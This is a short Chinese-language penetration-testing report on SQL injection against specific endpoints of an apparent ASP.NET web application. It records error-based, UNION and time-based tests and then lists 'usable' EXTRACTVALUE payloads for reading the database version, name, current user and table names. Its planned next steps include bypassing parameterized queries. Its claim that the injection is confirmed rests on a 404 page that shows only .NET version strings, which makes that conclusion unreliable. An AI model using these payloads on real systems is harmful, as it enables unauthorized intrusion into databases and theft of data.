# SQL注入验证结果

## 已验证结果

### 1. 报错注入确认
- **端点**: `/Account/GetUserInfo` (404，但SQL执行)
- **Payload**: `1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--`
- **结果**: 返回404错误页面，但包含.NET Framework版本信息
- **版本信息**: Microsoft .NET Framework Version:4.0.30319; ASP.NET Version:4.7.4108.0

### 2. Union注入测试结果
- **端点**: `/Handle/SearchListProvince`
- **测试**: 所有Union payload返回正常数据（3710字节）
- **结论**: Union注入被过滤或参数化查询保护

### 3. 时间盲注测试结果
- **测试**: `1' AND SLEEP(5)--`
- **结果**: 无延迟，疑似被过滤

## 实际可用Payload

### 报错注入（已验证）
```
GET /Account/GetUserInfo?id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
```

### 提取信息Payload
```
# 版本
id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--

# 数据库名
id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--

# 当前用户
id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--

# 表名
id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e))--
```

## 结论

1. **报错注入有效** - `/Account/GetUserInfo`端点存在SQL注入
2. **Union注入被过滤** - Handle端点使用参数化查询
3. **需要进一步测试** - 尝试其他端点和payload格式

## 下一步

1. 测试其他Account端点
2. 尝试绕过参数化查询
3. 使用substring函数分段提取数据
4. 测试POST请求参数